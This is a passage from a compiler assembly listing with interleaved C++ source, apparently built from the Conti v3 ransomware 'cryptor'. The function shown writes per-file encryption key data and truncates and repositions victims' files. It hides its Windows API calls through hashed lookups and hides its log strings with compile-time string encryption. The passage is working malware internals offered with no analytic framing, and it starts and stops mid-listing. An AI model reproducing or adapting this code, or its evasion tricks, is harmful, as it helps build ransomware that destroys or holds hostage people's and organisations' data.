  00366	c6 45 a1 39	 mov	 BYTE PTR $T4[rbp-239], 57 ; 00000039H
  0036a	c6 45 a2 54	 mov	 BYTE PTR $T4[rbp-238], 84 ; 00000054H
  0036e	c6 45 a3 07	 mov	 BYTE PTR $T4[rbp-237], 7
  00372	c6 45 a4 54	 mov	 BYTE PTR $T4[rbp-236], 84 ; 00000054H
  00376	c6 45 a5 1d	 mov	 BYTE PTR $T4[rbp-235], 29
  0037a	c6 45 a6 54	 mov	 BYTE PTR $T4[rbp-234], 84 ; 00000054H
  0037e	c6 45 a7 36	 mov	 BYTE PTR $T4[rbp-233], 54 ; 00000036H
  00382	c6 45 a8 54	 mov	 BYTE PTR $T4[rbp-232], 84 ; 00000054H
  00386	c6 45 a9 47	 mov	 BYTE PTR $T4[rbp-231], 71 ; 00000047H
  0038a	c6 45 aa 54	 mov	 BYTE PTR $T4[rbp-230], 84 ; 00000054H
  0038e	c6 45 ab 1d	 mov	 BYTE PTR $T4[rbp-229], 29
  00392	c6 45 ac 54	 mov	 BYTE PTR $T4[rbp-228], 84 ; 00000054H
  00396	c6 45 ad 2a	 mov	 BYTE PTR $T4[rbp-227], 42 ; 0000002aH
  0039a	c6 45 ae 54	 mov	 BYTE PTR $T4[rbp-226], 84 ; 00000054H
  0039e	c6 45 af 36	 mov	 BYTE PTR $T4[rbp-225], 54 ; 00000036H
  003a2	c6 45 b0 54	 mov	 BYTE PTR $T4[rbp-224], 84 ; 00000054H
  003a6	c6 45 b1 24	 mov	 BYTE PTR $T4[rbp-223], 36 ; 00000024H
  003aa	c6 45 b2 54	 mov	 BYTE PTR $T4[rbp-222], 84 ; 00000054H
  003ae	c6 45 b3 63	 mov	 BYTE PTR $T4[rbp-221], 99 ; 00000063H
  003b2	c6 45 b4 54	 mov	 BYTE PTR $T4[rbp-220], 84 ; 00000054H
  003b6	c6 45 b5 78	 mov	 BYTE PTR $T4[rbp-219], 120 ; 00000078H
  003ba	c6 45 b6 54	 mov	 BYTE PTR $T4[rbp-218], 84 ; 00000054H
  003be	c6 45 b7 36	 mov	 BYTE PTR $T4[rbp-217], 54 ; 00000036H
  003c2	c6 45 b8 54	 mov	 BYTE PTR $T4[rbp-216], 84 ; 00000054H
  003c6	c6 45 b9 24	 mov	 BYTE PTR $T4[rbp-215], 36 ; 00000024H
  003ca	c6 45 ba 54	 mov	 BYTE PTR $T4[rbp-214], 84 ; 00000054H
  003ce	c6 45 bb 39	 mov	 BYTE PTR $T4[rbp-213], 57 ; 00000039H
  003d2	c6 45 bc 54	 mov	 BYTE PTR $T4[rbp-212], 84 ; 00000054H
  003d6	c6 45 bd 4e	 mov	 BYTE PTR $T4[rbp-211], 78 ; 0000004eH
  003da	c6 45 be 54	 mov	 BYTE PTR $T4[rbp-210], 84 ; 00000054H
  003de	c6 45 bf 1d	 mov	 BYTE PTR $T4[rbp-209], 29
  003e2	c6 45 c0 54	 mov	 BYTE PTR $T4[rbp-208], 84 ; 00000054H
  003e6	c6 45 c1 36	 mov	 BYTE PTR $T4[rbp-207], 54 ; 00000036H
  003ea	c6 45 c2 54	 mov	 BYTE PTR $T4[rbp-206], 84 ; 00000054H
  003ee	c6 45 c3 59	 mov	 BYTE PTR $T4[rbp-205], 89 ; 00000059H
  003f2	c6 45 c4 54	 mov	 BYTE PTR $T4[rbp-204], 84 ; 00000054H
  003f6	40 88 7d c5	 mov	 BYTE PTR $T4[rbp-203], dil
  003fa	c6 45 c6 54	 mov	 BYTE PTR $T4[rbp-202], 84 ; 00000054H
  003fe	c6 45 c7 19	 mov	 BYTE PTR $T4[rbp-201], 25
  00402	c6 45 c8 54	 mov	 BYTE PTR $T4[rbp-200], 84 ; 00000054H
  00406	c6 45 c9 36	 mov	 BYTE PTR $T4[rbp-199], 54 ; 00000036H
  0040a	c6 45 ca 54	 mov	 BYTE PTR $T4[rbp-198], 84 ; 00000054H
  0040e	c6 45 cb 49	 mov	 BYTE PTR $T4[rbp-197], 73 ; 00000049H
  00412	c6 45 cc 54	 mov	 BYTE PTR $T4[rbp-196], 84 ; 00000054H
  00416	c6 45 cd 1d	 mov	 BYTE PTR $T4[rbp-195], 29
  0041a	c6 45 ce 54	 mov	 BYTE PTR $T4[rbp-194], 84 ; 00000054H
  0041e	c6 45 cf 07	 mov	 BYTE PTR $T4[rbp-193], 7
  00422	c6 45 d0 54	 mov	 BYTE PTR $T4[rbp-192], 84 ; 00000054H
  00426	c6 45 d1 6c	 mov	 BYTE PTR $T4[rbp-191], 108 ; 0000006cH
  0042a	c6 45 d2 54	 mov	 BYTE PTR $T4[rbp-190], 84 ; 00000054H
  0042e	c6 45 d3 01	 mov	 BYTE PTR $T4[rbp-189], 1
  00432	c6 45 d4 54	 mov	 BYTE PTR $T4[rbp-188], 84 ; 00000054H
  00436	40 88 7d d5	 mov	 BYTE PTR $T4[rbp-187], dil
  0043a	c6 45 d6 54	 mov	 BYTE PTR $T4[rbp-186], 84 ; 00000054H
  0043e	c6 45 d7 07	 mov	 BYTE PTR $T4[rbp-185], 7
  00442	c6 45 d8 54	 mov	 BYTE PTR $T4[rbp-184], 84 ; 00000054H
  00446	c6 45 d9 3b	 mov	 BYTE PTR $T4[rbp-183], 59 ; 0000003bH
  0044a	c6 45 da 54	 mov	 BYTE PTR $T4[rbp-182], 84 ; 00000054H
  0044e	c6 45 db 78	 mov	 BYTE PTR $T4[rbp-181], 120 ; 00000078H
  00452	c6 45 dc 54	 mov	 BYTE PTR $T4[rbp-180], 84 ; 00000054H
  00456	c6 45 dd 78	 mov	 BYTE PTR $T4[rbp-179], 120 ; 00000078H
  0045a	c6 45 de 54	 mov	 BYTE PTR $T4[rbp-178], 84 ; 00000054H
  0045e	c6 45 df 63	 mov	 BYTE PTR $T4[rbp-177], 99 ; 00000063H
  00462	c6 45 e0 54	 mov	 BYTE PTR $T4[rbp-176], 84 ; 00000054H
  00466	c6 45 e1 78	 mov	 BYTE PTR $T4[rbp-175], 120 ; 00000078H
  0046a	c6 45 e2 54	 mov	 BYTE PTR $T4[rbp-174], 84 ; 00000054H
  0046e	c6 45 e3 36	 mov	 BYTE PTR $T4[rbp-173], 54 ; 00000036H
  00472	c6 45 e4 54	 mov	 BYTE PTR $T4[rbp-172], 84 ; 00000054H
  00476	c6 45 e5 03	 mov	 BYTE PTR $T4[rbp-171], 3
  0047a	c6 45 e6 54	 mov	 BYTE PTR $T4[rbp-170], 84 ; 00000054H
  0047e	c6 45 e7 36	 mov	 BYTE PTR $T4[rbp-169], 54 ; 00000036H
  00482	c6 45 e8 54	 mov	 BYTE PTR $T4[rbp-168], 84 ; 00000054H
  00486	c6 45 e9 59	 mov	 BYTE PTR $T4[rbp-167], 89 ; 00000059H
  0048a	c6 45 ea 54	 mov	 BYTE PTR $T4[rbp-166], 84 ; 00000054H
  0048e	c6 45 eb 4e	 mov	 BYTE PTR $T4[rbp-165], 78 ; 0000004eH
  00492	c6 45 ec 54	 mov	 BYTE PTR $T4[rbp-164], 84 ; 00000054H
  00496	c6 45 ed 0e	 mov	 BYTE PTR $T4[rbp-163], 14
  0049a	c6 45 ee 54	 mov	 BYTE PTR $T4[rbp-162], 84 ; 00000054H
  0049e	c6 45 ef 54	 mov	 BYTE PTR $T4[rbp-161], 84 ; 00000054H
  004a2	c6 45 f0 54	 mov	 BYTE PTR $T4[rbp-160], 84 ; 00000054H
  004a6	0f b6 45 91	 movzx	 eax, BYTE PTR $T4[rbp-255]

; 58   :         return m_isDecrypted;

  004aa	0f b6 45 90	 movzx	 eax, BYTE PTR $T4[rbp-256]

; 63   :         if (!isDecrypted())

  004ae	84 c0		 test	 al, al
  004b0	75 5f		 jne	 SHORT $LN422@WriteEncry
  004b2	0f 1f 40 00 66
	66 0f 1f 84 00
	00 00 00 00	 npad	 14
$LL423@WriteEncry:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  004c0	0f b6 4c 3d 91	 movzx	 ecx, BYTE PTR $T4[rbp+rdi-255]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  004c5	b8 54 00 00 00	 mov	 eax, 84			; 00000054H
  004ca	2b c1		 sub	 eax, ecx
  004cc	8d 0c c0	 lea	 ecx, DWORD PTR [rax+rax*8]

; 40   :     return (a % n + n) % n;

  004cf	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  004d4	03 c9		 add	 ecx, ecx

; 40   :     return (a % n + n) % n;

  004d6	f7 e9		 imul	 ecx
  004d8	03 d1		 add	 edx, ecx
  004da	c1 fa 06	 sar	 edx, 6
  004dd	8b c2		 mov	 eax, edx
  004df	c1 e8 1f	 shr	 eax, 31
  004e2	03 d0		 add	 edx, eax
  004e4	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  004e7	2b c8		 sub	 ecx, eax
  004e9	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  004ee	83 c1 7f	 add	 ecx, 127		; 0000007fH
  004f1	f7 e9		 imul	 ecx
  004f3	03 d1		 add	 edx, ecx
  004f5	c1 fa 06	 sar	 edx, 6
  004f8	8b c2		 mov	 eax, edx
  004fa	c1 e8 1f	 shr	 eax, 31
  004fd	03 d0		 add	 edx, eax
  004ff	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00502	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00504	88 4c 3d 91	 mov	 BYTE PTR $T4[rbp+rdi-255], cl
  00508	48 ff c7	 inc	 rdi
  0050b	48 83 ff 60	 cmp	 rdi, 96			; 00000060H
  0050f	72 af		 jb	 SHORT $LL423@WriteEncry
$LN422@WriteEncry:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 801  : 		logs::Write(OBFW(L"Can't write key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());

  00511	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  00514	48 8d 4d 91	 lea	 rcx, QWORD PTR $T4[rbp-255]
  00518	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 802  : 		return FALSE;

  0051d	33 c0		 xor	 eax, eax
  0051f	e9 79 05 00 00	 jmp	 $LN1@WriteEncry
$LN3@WriteEncry:

; 803  : 
; 804  : 	}
; 805  : 
; 806  : 	Success = WriteFullData(FileInfo->FileHandle, Buffer, 10);

  00524	48 8b 4e 08	 mov	 rcx, QWORD PTR [rsi+8]
  00528	48 8d 95 e0 00
	00 00		 lea	 rdx, QWORD PTR Buffer$[rbp-256]
  0052f	41 b8 0a 00 00
	00		 mov	 r8d, 10
  00535	e8 00 00 00 00	 call	 ?WriteFullData@@YAHPEAX0K@Z ; WriteFullData

; 807  : 	if (!Success) {

  0053a	ba 0f 00 00 00	 mov	 edx, 15
  0053f	85 c0		 test	 eax, eax
  00541	0f 85 13 02 00
	00		 jne	 $LN4@WriteEncry
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  00547	44 8d 4a 4e	 lea	 r9d, QWORD PTR [rdx+78]
  0054b	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  00551	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  00556	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00558	40 88 7d 00	 mov	 BYTE PTR $T6[rbp-256], dil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  0055c	44 8b c8	 mov	 r9d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0055f	c6 45 01 60	 mov	 BYTE PTR $T6[rbp-255], 96 ; 00000060H
  00563	c6 45 02 33	 mov	 BYTE PTR $T6[rbp-254], 51 ; 00000033H
  00567	c6 45 03 0a	 mov	 BYTE PTR $T6[rbp-253], 10
  0056b	c6 45 04 33	 mov	 BYTE PTR $T6[rbp-252], 51 ; 00000033H
  0056f	c6 45 05 20	 mov	 BYTE PTR $T6[rbp-251], 32 ; 00000020H
  00573	c6 45 06 33	 mov	 BYTE PTR $T6[rbp-250], 51 ; 00000033H
  00577	c6 45 07 75	 mov	 BYTE PTR $T6[rbp-249], 117 ; 00000075H
  0057b	c6 45 08 33	 mov	 BYTE PTR $T6[rbp-248], 51 ; 00000033H
  0057f	c6 45 09 5b	 mov	 BYTE PTR $T6[rbp-247], 91 ; 0000005bH
  00583	c6 45 0a 33	 mov	 BYTE PTR $T6[rbp-246], 51 ; 00000033H
  00587	c6 45 0b 1b	 mov	 BYTE PTR $T6[rbp-245], 27
  0058b	c6 45 0c 33	 mov	 BYTE PTR $T6[rbp-244], 51 ; 00000033H
  0058f	c6 45 0d 39	 mov	 BYTE PTR $T6[rbp-243], 57 ; 00000039H
  00593	c6 45 0e 33	 mov	 BYTE PTR $T6[rbp-242], 51 ; 00000033H
  00597	c6 45 0f 1d	 mov	 BYTE PTR $T6[rbp-241], 29
  0059b	c6 45 10 33	 mov	 BYTE PTR $T6[rbp-240], 51 ; 00000033H
  0059f	c6 45 11 04	 mov	 BYTE PTR $T6[rbp-239], 4
  005a3	c6 45 12 33	 mov	 BYTE PTR $T6[rbp-238], 51 ; 00000033H
  005a7	c6 45 13 5b	 mov	 BYTE PTR $T6[rbp-237], 91 ; 0000005bH
  005ab	c6 45 14 33	 mov	 BYTE PTR $T6[rbp-236], 51 ; 00000033H
  005af	c6 45 15 07	 mov	 BYTE PTR $T6[rbp-235], 7
  005b3	c6 45 16 33	 mov	 BYTE PTR $T6[rbp-234], 51 ; 00000033H
  005b7	c6 45 17 1b	 mov	 BYTE PTR $T6[rbp-233], 27
  005bb	c6 45 18 33	 mov	 BYTE PTR $T6[rbp-232], 51 ; 00000033H
  005bf	c6 45 19 42	 mov	 BYTE PTR $T6[rbp-231], 66 ; 00000042H
  005c3	c6 45 1a 33	 mov	 BYTE PTR $T6[rbp-230], 51 ; 00000033H
  005c7	c6 45 1b 07	 mov	 BYTE PTR $T6[rbp-229], 7
  005cb	c6 45 1c 33	 mov	 BYTE PTR $T6[rbp-228], 51 ; 00000033H
  005cf	c6 45 1d 77	 mov	 BYTE PTR $T6[rbp-227], 119 ; 00000077H
  005d3	c6 45 1e 33	 mov	 BYTE PTR $T6[rbp-226], 51 ; 00000033H
  005d7	c6 45 1f 1b	 mov	 BYTE PTR $T6[rbp-225], 27
  005db	c6 45 20 33	 mov	 BYTE PTR $T6[rbp-224], 51 ; 00000033H
  005df	c6 45 21 26	 mov	 BYTE PTR $T6[rbp-223], 38 ; 00000026H
  005e3	c6 45 22 33	 mov	 BYTE PTR $T6[rbp-222], 51 ; 00000033H
  005e7	c6 45 23 3f	 mov	 BYTE PTR $T6[rbp-221], 63 ; 0000003fH
  005eb	c6 45 24 33	 mov	 BYTE PTR $T6[rbp-220], 51 ; 00000033H
  005ef	c6 45 25 1d	 mov	 BYTE PTR $T6[rbp-219], 29
  005f3	c6 45 26 33	 mov	 BYTE PTR $T6[rbp-218], 51 ; 00000033H
  005f7	c6 45 27 1b	 mov	 BYTE PTR $T6[rbp-217], 27
  005fb	c6 45 28 33	 mov	 BYTE PTR $T6[rbp-216], 51 ; 00000033H
  005ff	c6 45 29 26	 mov	 BYTE PTR $T6[rbp-215], 38 ; 00000026H
  00603	c6 45 2a 33	 mov	 BYTE PTR $T6[rbp-214], 51 ; 00000033H
  00607	c6 45 2b 04	 mov	 BYTE PTR $T6[rbp-213], 4
  0060b	c6 45 2c 33	 mov	 BYTE PTR $T6[rbp-212], 51 ; 00000033H
  0060f	c6 45 2d 61	 mov	 BYTE PTR $T6[rbp-211], 97 ; 00000061H
  00613	c6 45 2e 33	 mov	 BYTE PTR $T6[rbp-210], 51 ; 00000033H
  00617	c6 45 2f 07	 mov	 BYTE PTR $T6[rbp-209], 7
  0061b	c6 45 30 33	 mov	 BYTE PTR $T6[rbp-208], 51 ; 00000033H
  0061f	c6 45 31 1b	 mov	 BYTE PTR $T6[rbp-207], 27
  00623	c6 45 32 33	 mov	 BYTE PTR $T6[rbp-206], 51 ; 00000033H
  00627	c6 45 33 37	 mov	 BYTE PTR $T6[rbp-205], 55 ; 00000037H
  0062b	c6 45 34 33	 mov	 BYTE PTR $T6[rbp-204], 51 ; 00000033H
  0062f	c6 45 35 3c	 mov	 BYTE PTR $T6[rbp-203], 60 ; 0000003cH
  00633	c6 45 36 33	 mov	 BYTE PTR $T6[rbp-202], 51 ; 00000033H
  00637	c6 45 37 50	 mov	 BYTE PTR $T6[rbp-201], 80 ; 00000050H
  0063b	c6 45 38 33	 mov	 BYTE PTR $T6[rbp-200], 51 ; 00000033H
  0063f	c6 45 39 1b	 mov	 BYTE PTR $T6[rbp-199], 27
  00643	c6 45 3a 33	 mov	 BYTE PTR $T6[rbp-198], 51 ; 00000033H
  00647	c6 45 3b 5d	 mov	 BYTE PTR $T6[rbp-197], 93 ; 0000005dH
  0064b	c6 45 3c 33	 mov	 BYTE PTR $T6[rbp-196], 51 ; 00000033H
  0064f	c6 45 3d 07	 mov	 BYTE PTR $T6[rbp-195], 7
  00653	c6 45 3e 33	 mov	 BYTE PTR $T6[rbp-194], 51 ; 00000033H
  00657	c6 45 3f 5b	 mov	 BYTE PTR $T6[rbp-193], 91 ; 0000005bH
  0065b	c6 45 40 33	 mov	 BYTE PTR $T6[rbp-192], 51 ; 00000033H
  0065f	c6 45 41 79	 mov	 BYTE PTR $T6[rbp-191], 121 ; 00000079H
  00663	c6 45 42 33	 mov	 BYTE PTR $T6[rbp-190], 51 ; 00000033H
  00667	c6 45 43 0a	 mov	 BYTE PTR $T6[rbp-189], 10
  0066b	c6 45 44 33	 mov	 BYTE PTR $T6[rbp-188], 51 ; 00000033H
  0066f	c6 45 45 3c	 mov	 BYTE PTR $T6[rbp-187], 60 ; 0000003cH
  00673	c6 45 46 33	 mov	 BYTE PTR $T6[rbp-186], 51 ; 00000033H
  00677	c6 45 47 5b	 mov	 BYTE PTR $T6[rbp-185], 91 ; 0000005bH
  0067b	c6 45 48 33	 mov	 BYTE PTR $T6[rbp-184], 51 ; 00000033H
  0067f	c6 45 49 1f	 mov	 BYTE PTR $T6[rbp-183], 31
  00683	c6 45 4a 33	 mov	 BYTE PTR $T6[rbp-182], 51 ; 00000033H
  00687	c6 45 4b 1d	 mov	 BYTE PTR $T6[rbp-181], 29
  0068b	c6 45 4c 33	 mov	 BYTE PTR $T6[rbp-180], 51 ; 00000033H
  0068f	c6 45 4d 1d	 mov	 BYTE PTR $T6[rbp-179], 29
  00693	c6 45 4e 33	 mov	 BYTE PTR $T6[rbp-178], 51 ; 00000033H
  00697	c6 45 4f 3f	 mov	 BYTE PTR $T6[rbp-177], 63 ; 0000003fH
  0069b	c6 45 50 33	 mov	 BYTE PTR $T6[rbp-176], 51 ; 00000033H
  0069f	c6 45 51 1d	 mov	 BYTE PTR $T6[rbp-175], 29
  006a3	c6 45 52 33	 mov	 BYTE PTR $T6[rbp-174], 51 ; 00000033H
  006a7	c6 45 53 1b	 mov	 BYTE PTR $T6[rbp-173], 27
  006ab	c6 45 54 33	 mov	 BYTE PTR $T6[rbp-172], 51 ; 00000033H
  006af	c6 45 55 25	 mov	 BYTE PTR $T6[rbp-171], 37 ; 00000025H
  006b3	c6 45 56 33	 mov	 BYTE PTR $T6[rbp-170], 51 ; 00000033H
  006b7	c6 45 57 1b	 mov	 BYTE PTR $T6[rbp-169], 27
  006bb	c6 45 58 33	 mov	 BYTE PTR $T6[rbp-168], 51 ; 00000033H
  006bf	c6 45 59 37	 mov	 BYTE PTR $T6[rbp-167], 55 ; 00000037H
  006c3	c6 45 5a 33	 mov	 BYTE PTR $T6[rbp-166], 51 ; 00000033H
  006c7	c6 45 5b 61	 mov	 BYTE PTR $T6[rbp-165], 97 ; 00000061H
  006cb	c6 45 5c 33	 mov	 BYTE PTR $T6[rbp-164], 51 ; 00000033H
  006cf	c6 45 5d 7a	 mov	 BYTE PTR $T6[rbp-163], 122 ; 0000007aH
  006d3	c6 45 5e 33	 mov	 BYTE PTR $T6[rbp-162], 51 ; 00000033H
  006d7	c6 45 5f 33	 mov	 BYTE PTR $T6[rbp-161], 51 ; 00000033H
  006db	c6 45 60 33	 mov	 BYTE PTR $T6[rbp-160], 51 ; 00000033H
  006df	0f b6 45 01	 movzx	 eax, BYTE PTR $T6[rbp-255]

; 58   :         return m_isDecrypted;

  006e3	0f b6 45 00	 movzx	 eax, BYTE PTR $T6[rbp-256]

; 63   :         if (!isDecrypted())

  006e7	84 c0		 test	 al, al
  006e9	75 59		 jne	 SHORT $LN630@WriteEncry
  006eb	0f 1f 44 00 00	 npad	 5
$LL631@WriteEncry:

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  006f0	0f b6 4c 3d 01	 movzx	 ecx, BYTE PTR $T6[rbp+rdi-255]

; 40   :     return (a % n + n) % n;

  006f5	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  006fa	83 e9 33	 sub	 ecx, 51			; 00000033H
  006fd	44 6b c1 29	 imul	 r8d, ecx, 41		; 00000029H

; 40   :     return (a % n + n) % n;

  00701	41 f7 e8	 imul	 r8d
  00704	41 03 d0	 add	 edx, r8d
  00707	c1 fa 06	 sar	 edx, 6
  0070a	8b c2		 mov	 eax, edx
  0070c	c1 e8 1f	 shr	 eax, 31
  0070f	03 d0		 add	 edx, eax
  00711	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00714	44 2b c0	 sub	 r8d, eax
  00717	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0071c	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00720	41 f7 e8	 imul	 r8d
  00723	41 03 d0	 add	 edx, r8d
  00726	c1 fa 06	 sar	 edx, 6
  00729	8b c2		 mov	 eax, edx
  0072b	c1 e8 1f	 shr	 eax, 31
  0072e	03 d0		 add	 edx, eax
  00730	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00733	44 2b c0	 sub	 r8d, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00736	44 88 44 3d 01	 mov	 BYTE PTR $T6[rbp+rdi-255], r8b
  0073b	48 ff c7	 inc	 rdi
  0073e	48 83 ff 60	 cmp	 rdi, 96			; 00000060H
  00742	72 ac		 jb	 SHORT $LL631@WriteEncry
$LN630@WriteEncry:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 809  : 		logs::Write(OBFW(L"Can't write key for file %s. GetLastError = %lu"), FileInfo->Filename, pGetLastError());

  00744	48 8b 16	 mov	 rdx, QWORD PTR [rsi]
  00747	48 8d 4d 01	 lea	 rcx, QWORD PTR $T6[rbp-255]
  0074b	45 8b c1	 mov	 r8d, r9d
  0074e	e8 00 00 00 00	 call	 ?Write@logs@@YAXPEB_WZZ	; logs::Write

; 810  : 		return FALSE;

  00753	33 c0		 xor	 eax, eax
  00755	e9 43 03 00 00	 jmp	 $LN1@WriteEncry
$LN4@WriteEncry:

; 811  : 
; 812  : 	}
; 813  : 
; 814  : 	pSetEndOfFile(FileInfo->FileHandle);

  0075a	48 8b 5e 08	 mov	 rbx, QWORD PTR [rsi+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 149  : 	pFunction = (BOOL(WINAPI*)(HANDLE))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x5fa74ea0, 99);//GetProcAddress(hKernel32, OBFA("SetEndOfFile"));

  0075e	41 b9 63 00 00
	00		 mov	 r9d, 99			; 00000063H
  00764	41 b8 a0 4e a7
	5f		 mov	 r8d, 1604800160		; 5fa74ea0H
  0076a	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 150  : 	return pFunction(hFile);

  0076f	48 8b cb	 mov	 rcx, rbx
  00772	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 815  : 	Success = (BOOL)pSetFilePointerEx(FileInfo->FileHandle, Offset, NULL, FILE_BEGIN);

  00774	48 8b 5e 08	 mov	 rbx, QWORD PTR [rsi+8]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 249  : 	pFunction = (BOOL(WINAPI*)(HANDLE, LARGE_INTEGER, PLARGE_INTEGER, DWORD))getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0xd6e51ba7, 89);//GetProcAddress(hKernel32, OBFA("SetFilePointerEx"));

  00778	ba 0f 00 00 00	 mov	 edx, 15
  0077d	41 b8 a7 1b e5
	d6		 mov	 r8d, -689628249		; d6e51ba7H
  00783	44 8d 4a 4a	 lea	 r9d, QWORD PTR [rdx+74]
  00787	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 250  : 	return pFunction(hFile, liDistanceToMove, lpNewFilePointer, dwMoveMethod);

  0078c	45 33 c9	 xor	 r9d, r9d
  0078f	45 33 c0	 xor	 r8d, r8d
  00792	48 8b d7	 mov	 rdx, rdi
  00795	48 8b cb	 mov	 rcx, rbx
  00798	ff d0		 call	 rax
  0079a	8b d8		 mov	 ebx, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 816  : 	if (!Success) {

  0079c	85 c0		 test	 eax, eax
  0079e	0f 85 f7 02 00
	00		 jne	 $LN5@WriteEncry
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 209  : 	pFunction = (DWORD(WINAPI*)())getapi::GetProcAddressEx2(NULL, KERNEL32_MODULE_ID, 0x9aab3800, 93);//GetProcAddress(hKernel32, OBFA("GetLastError"));

  007a4	8d 50 0f	 lea	 edx, QWORD PTR [rax+15]
  007a7	41 b8 00 38 ab
	9a		 mov	 r8d, -1700055040	; 9aab3800H
  007ad	44 8d 48 5d	 lea	 r9d, QWORD PTR [rax+93]
  007b1	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 210  : 	return pFunction();

  007b6	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  007b8	40 88 7d 70	 mov	 BYTE PTR $T8[rbp-256], dil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 210  : 	return pFunction();

  007bc	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  007bf	c6 45 71 54	 mov	 BYTE PTR $T8[rbp-255], 84 ; 00000054H
  007c3	c6 45 72 2e	 mov	 BYTE PTR $T8[rbp-254], 46 ; 0000002eH
  007c7	c6 45 73 41	 mov	 BYTE PTR $T8[rbp-253], 65 ; 00000041H
  007cb	c6 45 74 2e	 mov	 BYTE PTR $T8[rbp-252], 46 ; 0000002eH
  007cf	c6 45 75 3d	 mov	 BYTE PTR $T8[rbp-251], 61 ; 0000003dH
  007d3	c6 45 76 2e	 mov	 BYTE PTR $T8[rbp-250], 46 ; 0000002eH
  007d7	c6 45 77 22	 mov	 BYTE PTR $T8[rbp-249], 34 ; 00000022H
  007db	c6 45 78 2e	 mov	 BYTE PTR $T8[rbp-248], 46 ; 0000002eH
  007df	c6 45 79 6c	 mov	 BYTE PTR $T8[rbp-247], 108 ; 0000006cH
  007e3	c6 45 7a 2e	 mov	 BYTE PTR $T8[rbp-246], 46 ; 0000002eH
  007e7	c6 45 7b 55	 mov	 BYTE PTR $T8[rbp-245], 85 ; 00000055H
  007eb	c6 45 7c 2e	 mov	 BYTE PTR $T8[rbp-244], 46 ; 0000002eH
  007ef	c6 45 7d 44	 mov	 BYTE PTR $T8[rbp-243], 68 ; 00000044H
  007f3	c6 45 7e 2e	 mov	 BYTE PTR $T8[rbp-242], 46 ; 0000002eH
  007f7	c6 45 7f 32	 mov	 BYTE PTR $T8[rbp-241], 50 ; 00000032H
  007fb	c6 85 80 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-240], 46 ; 0000002eH
  00802	c6 85 81 00 00
	00 2b		 mov	 BYTE PTR $T8[rbp-239], 43 ; 0000002bH
  00809	c6 85 82 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-238], 46 ; 0000002eH
  00810	c6 85 83 00 00
	00 6c		 mov	 BYTE PTR $T8[rbp-237], 108 ; 0000006cH
  00817	c6 85 84 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-236], 46 ; 0000002eH
  0081e	c6 85 85 00 00
	00 36		 mov	 BYTE PTR $T8[rbp-235], 54 ; 00000036H
  00825	c6 85 86 00 00
	00 2e		 mov	 BYTE PTR $T8[rbp-234], 46 ; 0000002eH
  0082c	c6 85 87 00 00
